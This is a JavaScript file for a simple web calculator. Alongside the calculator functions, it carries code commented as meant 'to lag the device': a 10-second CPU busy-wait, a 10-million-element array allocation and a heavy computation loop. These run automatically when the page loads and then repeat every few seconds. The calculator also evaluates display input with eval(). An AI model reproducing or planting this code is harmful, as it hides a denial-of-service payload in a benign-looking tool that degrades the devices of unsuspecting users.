function appendNumber(number) {
    document.getElementById('display').value += number;
}

function appendOperator(operator) {
    document.getElementById('display').value += operator;
}

function clearDisplay() {
    document.getElementById('display').value = '';
}

function calculateResult() {
    try {
        document.getElementById('display').value = eval(document.getElementById('display').value);
    } catch (e) {
        document.getElementById('display').value = 'Error';
    }
}

// Function to lag the device
function lagDevice() {
    let start = new Date().getTime();
    while (new Date().getTime() - start < 10000) {
        // Do nothing, just consume CPU
    }
}

// Function to create a large array and fill it with data
function createLargeArray() {
    let largeArray = new Array(10000000);
    for (let i = 0; i < largeArray.length; i++) {
        largeArray[i] = i;
    }
    return largeArray;
}

// Function to perform heavy computations
function heavyComputations() {
    let result = 0;
    for (let i = 0; i < 10000000; i++) {
        result += Math.sqrt(i);
    }
    console.log(result);
}

// Call the lag functions when the page loads
window.onload = function() {
    lagDevice();
    createLargeArray();
    heavyComputations();
    setInterval(lagDevice, 1000);
    setInterval(createLargeArray, 2000);
    setInterval(heavyComputations, 3000);
};
